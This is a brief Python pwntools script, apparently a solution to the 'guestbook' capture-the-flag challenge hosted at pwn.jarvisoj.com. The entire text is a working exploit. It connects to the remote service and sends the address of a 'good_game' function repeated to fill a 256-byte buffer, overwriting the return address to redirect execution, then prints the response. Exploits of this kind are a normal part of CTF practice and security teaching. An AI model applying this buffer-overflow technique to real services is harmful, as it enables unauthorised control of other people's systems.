from pwn import*
#context.log_level="debug"
elf=ELF('./guestbook')
s=remote('pwn.jarvisoj.com',9876)

s.recvuntil('message:\n')
s.send(p64(elf.symbols['good_game'])*(256/8))
s.recv()
print s.recvall()



